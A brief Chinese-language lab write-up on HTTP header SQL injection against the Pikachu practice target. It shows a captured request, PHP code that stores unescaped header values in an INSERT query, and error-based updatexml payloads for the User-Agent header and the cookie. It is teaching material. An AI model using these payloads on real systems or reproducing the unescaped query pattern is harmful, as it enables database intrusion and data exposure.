# http头注入

## 原理

http头注入指的是一些，http头的信息会存在sql语句查询，如果没有相关的防护，就可能存在sql注入漏洞

## 应用

以pikachu靶场为例，需要抓包改包

抓取的数据包

```
GET /pikachu/vul/sqli/sqli_header/sqli_header.php HTTP/1.1
Host: 192.168.31.26
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.31.26/pikachu/vul/sqli/sqli_header/sqli_header_login.php
Connection: close
Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=9o724nt8u6ofokl5ie7nu6ljs2
Upgrade-Insecure-Requests: 1
```

源码

```
//直接获取前端过来的头信息,没人任何处理,留下安全隐患
$remoteipadd=$_SERVER['REMOTE_ADDR'];
$useragent=$_SERVER['HTTP_USER_AGENT'];
$httpaccept=$_SERVER['HTTP_ACCEPT'];
$remoteport=$_SERVER['REMOTE_PORT'];

//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞
$query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remotep
ort')"；
```

可以看出后台使用insert()函数进行数据的插入，当然这是需要猜的，此处为了快些显示

```
payload:firefox' or updatexml(1,concat(0x7e,version()),0) or '
```

同时此处也存在cookie注入

```
payload:admin 'and updatexml(1,concat(0x7e,version()),0)#
```


